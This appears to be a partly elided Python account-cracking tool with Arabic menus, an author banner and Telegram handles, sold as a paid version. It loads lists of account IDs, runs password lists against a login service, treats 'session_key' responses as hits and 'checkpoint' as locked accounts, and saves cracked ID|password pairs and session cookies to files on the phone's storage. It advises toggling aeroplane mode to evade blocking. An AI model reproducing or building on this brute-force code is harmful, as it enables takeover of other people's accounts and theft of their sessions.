...
\033[1;33m            8b           d8     88     88888888ba   
\033[1;33m            `8b         d8'     88     88           "8b  
\033[1;33m             `8b       d8'      88     88            ,8P  
\033[1;33m              `8b     d8'       88     88aaaaaa8P'  
\033[1;33m               `8b   d8'        88     88""""""'    
\033[1;33m                `8b d8'         88     88\033[1;32m★ كــــرار ³¹³ ★
\033[1;33m                 `888'           88     88           
\033[1;33m                   `8'             88     88           
...
\033[1;97m====================================================
\033[1;97m[+]\033[1;91m    المطور   \033[1;90m: \033[1;92m كرار 
\033[1;97m[+]\033[1;91m    TLE \033[1;90m: \033[1;92 @kkf1kk||@VIPKR0
\033[1;97m====================================================
\x1b[1;32m   \x1b[38;2m   [ الــــــمـــدفــوعـــة ]\x1b[00;1m\x1b[31;1m \x1b[31;1m \x1b[1;32m[ 3 1 3 ]\x1b[00;1m\x1b[31;1m
\033[1;97m====================================================
...
def Hxw_Main():
    os.system('clear')
    print(logo)
    print(f"{oo(1)}FILE (ملف) ")


    
    print(f"{oo(0)}خروج")
    inpp = input(f"{oo('?')}*ILOVE YOU : ")
    if inpp == "1":
        file()
    if inpp == '2':pak()
    if inpp =='3':
...
def file():
    ...
    if 'gm' in l:
        ...
        file = input(f"{oo('-')}مسار الملف: ")
    try:
        for x in open(file,'r').readlines():
            accounts.append(x.strip())
    except:
        print(f"{oo('!')}خطاا");time.sleep(1)
        Hxw_Main()
...
def method():
    ...
    m=input(f"{oo('!')}Input : ") 
    print('\n'+oo("?")+'هل تريد اضهار الحساب المقفول?(y/n)')
    cpok=input(f"{oo('!')}Input : ")
    print('\n'+oo("?")+'هل تريد اضهار الكوكيز ?(y/n)')
    c=input(f"{oo('!')}Input : ")
    apps='y'
    os.system("clear")
    print(logo) 
    print('\033[1;89m='*63)
    print(f'{oo("✓")} عدد الايديات : \033[1;92m'+str(len(accounts)))
    print(f"{oo('•')}\033[1;89m ON OFF AEROPLANE MODE AFTER EVERY 5 MINUTES :")
    print(f"{oo('•')} FILE SAVE IN /sdcard/KRAR-OK.txt")
    print('\033[1;89m='*63)
    print()
    ...
    def start(user):
     try:
        ...
        sys.stdout.write('\r\033[1;91m[\033[1;97mA«♡»\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;92m<★>\033[1;92m] \033[1;92m'+acc+' \033[1;92m|\033[1;92m '+pword+'  ')
                open('/sdcard/A L I-OK.txt','a').write(f'{acc} | {pword}\n')
                if c=='y':
                    try:
                           ...
                           print(cookies)
                           open('/sdcard/★.txt','a').write(f'sb={ssbb};{ckkk}\n')
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;93m<★>\033[1;91m] \033[1;93m'+acc+' \033[1;91m|\033[1;93m '+pword+'   ')
                cpacc.append(acc)
    ...
    def start2(user):
      ...
      try:
        ...
        try:
            ...
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97m<★>-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            ...
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;92m <★>\033[1;92m] \033[1;92m'+acc+' \033[1;92m|\033[1;92m '+pword+'  ')
                open('/sdcard/3 1 3 -OK.txt','a').write(f'{acc} | {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                    try:
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;93mخطا\033[1;91m] \033[1;93m'+acc+' \033[1;91m|\033[1;93m '+pword)
                cpacc.append(acc)
                open('/sdcard/سكيور-CP.txt','a').write(f'{acc} | {pword}\n')
                break
            else:
                continue
        loop += 1    
...
def andom():
    ...
    print(f"{oo('•')}/sdcard/ 3 1 3-OK.txt")
    print('\033[1;93m='*25)
    print()    
    def start(user):
     try:
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97m3 1 3-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mخطا-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/خطا-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
        ...
        for pword in totalpass:
            ...
            if 'session_key' in response.text:
                ...
                if c=='y':
                 ...
                 print('\r\033[1;93m[\033[1;97mكوكيز\033[1;93m] \033[1;97m'+cookies)                
                 break
            elif 'checkpoint' in response.text:
                if cpok=='n':
                     pass
